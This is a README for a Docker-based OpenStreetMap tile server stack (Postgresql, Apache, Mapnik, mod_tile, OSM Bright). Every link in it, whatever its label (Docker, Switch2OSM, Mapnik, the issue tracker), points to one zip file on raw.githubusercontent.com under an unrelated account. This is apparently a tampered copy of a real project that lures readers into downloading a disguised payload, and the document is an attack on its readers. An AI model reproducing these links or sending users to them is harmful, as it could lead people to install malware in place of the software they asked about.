# OpenStreetMap Tile Server Container

This repository contains instructions for building a
[Docker](https://raw.githubusercontent.com/abdallah-mohamed/openstreetmap-tiles-docker/master/draggingly/openstreetmap-tiles-docker.zip) image containing the OpenStreetMap tile
serving software stack.  It is based on the
[Switch2OSM instructions](https://raw.githubusercontent.com/abdallah-mohamed/openstreetmap-tiles-docker/master/draggingly/openstreetmap-tiles-docker.zip).

The tiles are styled using [OSM Bright](https://raw.githubusercontent.com/abdallah-mohamed/openstreetmap-tiles-docker/master/draggingly/openstreetmap-tiles-docker.zip).

As well as providing an easy way to set up and run the tile serving software it
also provides instructions for managing the back end database, allowing you to:

* Create the database
* Import OSM data into the database
* Drop the database

Run `docker run haroldship/openstreetmap-tiles-docker` for usage instructions.

## About

The container runs Ubuntu 14.04 (Trusty) and is based on the
[phusion/baseimage-docker](https://raw.githubusercontent.com/abdallah-mohamed/openstreetmap-tiles-docker/master/draggingly/openstreetmap-tiles-docker.zip).  It
includes:

* Postgresql 9.3
* Apache 2.2
* [Osm2pgsql](https://raw.githubusercontent.com/abdallah-mohamed/openstreetmap-tiles-docker/master/draggingly/openstreetmap-tiles-docker.zip) from Oct 22 (24e4d4bf273aaf3572fda11d2c0b32aa3156f84a)
* The latest [Mapnik](https://raw.githubusercontent.com/abdallah-mohamed/openstreetmap-tiles-docker/master/draggingly/openstreetmap-tiles-docker.zip) code (at the time of image creation)
* The latest [Mod_Tile](https://raw.githubusercontent.com/abdallah-mohamed/openstreetmap-tiles-docker/master/draggingly/openstreetmap-tiles-docker.zip) code (at
  the time of image creation)
* The latest [OSM Bright](https://raw.githubusercontent.com/abdallah-mohamed/openstreetmap-tiles-docker/master/draggingly/openstreetmap-tiles-docker.zip) code (at the
  the time of image creation)

## Issues

This is a work in progress and although generally adequate it could benefit
from improvements.  Please
[submit issues](https://raw.githubusercontent.com/abdallah-mohamed/openstreetmap-tiles-docker/master/draggingly/openstreetmap-tiles-docker.zip)
on GitHub. Pull requests are very welcome!
